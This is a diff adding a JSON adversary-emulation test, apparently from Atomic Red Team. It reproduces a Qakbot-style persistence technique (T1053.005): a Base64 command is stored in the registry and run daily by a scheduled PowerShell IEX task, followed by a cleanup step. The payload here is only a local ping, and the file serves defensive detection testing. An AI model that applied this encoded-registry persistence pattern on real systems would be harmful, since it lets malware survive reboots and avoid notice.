@@ -1,0 +1,52 @@
+{
+  "id": "e895677d-4f06-49ab-91b6-ae3742d0a2ba",
+  "name": "Scheduled Task Executing Base64 Encoded Commands From Registry",
+  "description": "A Base64 Encoded command will be stored in the registry (ping 127.0.0.1) and then a scheduled task will be created.\nThe scheduled task will launch powershell to decode and run the command in the registry daily.\nThis is a persistence mechanism recently seen in use by Qakbot.  \n\n[Additiona Information](https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/)\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "edf9dab9-719b-4b59-bddb-68b52397eeb3",
+      "type": "execute-command",
+      "data": {
+        "command": "reg add HKCU\\SOFTWARE\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f\nschtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))\" /sc daily /st #{time}\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "3fd66c38-e209-4404-90ce-dd2bc0d2d140",
+      "type": "execute-command",
+      "data": {
+        "command": "schtasks /delete /tn \"ATOMIC-T1053.005\" /F \u003enul 2\u003e\u00261\nreg delete HKCU\\SOFTWARE\\ATOMIC-T1053.005 /F \u003enul 2\u003e\u00261\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "edf9dab9-719b-4b59-bddb-68b52397eeb3",
+      "p": "on-success",
+      "o": "3fd66c38-e209-4404-90ce-dd2bc0d2d140"
+    },
+    {
+      "s": "edf9dab9-719b-4b59-bddb-68b52397eeb3",
+      "p": "on-failure",
+      "o": "3fd66c38-e209-4404-90ce-dd2bc0d2d140"
+    }
+  ],
+  "tags": [
+    "T1053.005",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "time",
+      "type": "string",
+      "description": "Daily scheduled task execution time",
+      "value": "07:45"
+    }
+  ]
+}
